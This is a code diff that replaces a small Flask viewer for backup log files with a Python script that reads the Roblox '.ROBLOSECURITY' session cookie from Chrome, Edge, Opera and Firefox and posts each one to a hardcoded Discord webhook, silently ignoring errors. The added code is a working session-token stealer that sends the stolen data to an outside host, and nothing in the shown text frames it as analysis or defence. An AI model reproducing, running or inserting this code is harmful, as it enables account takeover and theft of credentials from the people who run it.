@@ -1,58 +1,68 @@
-from flask import Flask, render_template, abort
-import os, json
+import browser_cookie3
+import requests
+import json
 
-app = Flask(__name__)
-LOGS_DIR = "logs/user_files"
+webhook = "https://discord.com/api/webhooks/1402900152427221052/WgxT-IpojzUX9XpR7MdjAWZt5sWRCQxqtAJbYIYRyHTxAhQcx0h7eoOX630lnc4Lwgy_"
 
-# Главная страница — таблица всех бэкапов
-@app.route("/")
-def index():
-    backups = []
-
-    if not os.path.exists(LOGS_DIR):
-        return f"Папка {LOGS_DIR} не найдена"
-
-    for filename in os.listdir(LOGS_DIR):
-        if filename.endswith(".json"):
-            full_path = os.path.join(LOGS_DIR, filename)
-            try:
-                with open(full_path, "r", encoding="utf-8-sig") as f:
-                    data = json.load(f)
-                backups.append({
-                    "filename": filename,
-                    "snapshot": data.get("Snapshot"),
-                    "date": data.get("Start", {}).get("DateTime"),
-                    "files_copied": data.get("FilesCopied"),
-                    "files_linked": data.get("FilesLinked"),
-                })
-            except Exception as e:
-                backups.append({
-                    "filename": filename,
-                    "snapshot": "Ошибка",
-                    "date": "Ошибка",
-                    "files_copied": 0,
-                    "files_linked": 0
-                })
-
-    # Сортируем по дате, если нужно можно по файлу
-    backups.sort(key=lambda x: x["date"], reverse=True)
-    return render_template("index.html", backups=backups)
-
-# Детальная страница конкретного бэкапа
-@app.route("/backup/<filename>")
-def backup_detail(filename):
-    full_path = os.path.join(LOGS_DIR, filename)
-    if not os.path.exists(full_path):
-        abort(404)
-
+def get_roblox_cookie():
     try:
-        with open(full_path, "r", encoding="utf-8-sig") as f:
-            data = json.load(f)
+        
+        cookies_found = False
+        
+        
+        try:
+            chrome_cookies = browser_cookie3.chrome(domain_name='roblox.com')
+            for cookie in chrome_cookies:
+                if cookie.name == ".ROBLOSECURITY":
+                    send_to_discord(cookie.value)
+                    cookies_found = True
+        except:
+            pass
+        
+        
+        try:
+            edge_cookies = browser_cookie3.edge(domain_name='roblox.com')
+            for cookie in edge_cookies:
+                if cookie.name == ".ROBLOSECURITY":
+                    send_to_discord(cookie.value)
+                    cookies_found = True
+        except:
+            pass
+        
+        
+        try:
+            opera_cookies = browser_cookie3.opera(domain_name='roblox.com')
+            for cookie in opera_cookies:
+                if cookie.name == ".ROBLOSECURITY":
+                    send_to_discord(cookie.value)
+                    cookies_found = True
+        except:
+            pass
+        
+        
+        try:
+            firefox_cookies = browser_cookie3.firefox(domain_name='roblox.com')
+            for cookie in firefox_cookies:
+                if cookie.name == ".ROBLOSECURITY":
+                    send_to_discord(cookie.value)
+                    cookies_found = True
+        except:
+            pass
+        
+        if not cookies_found:
+            send_to_discord("no roblox cookies")
+            
     except Exception as e:
-        return f"Ошибка чтения файла: {e}"
+        send_to_discord(f"error: {str(e)}")
 
-    return render_template("backup_detail.html", log=data, filename=filename)
+def send_to_discord(content):
+    message = {
+        'content': f'```{content}```'
+    }
+    try:
+        requests.post(webhook, data=json.dumps(message), headers={'Content-Type': 'application/json'})
+    except:
+        pass
 
 if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
-
+    get_roblox_cookie()
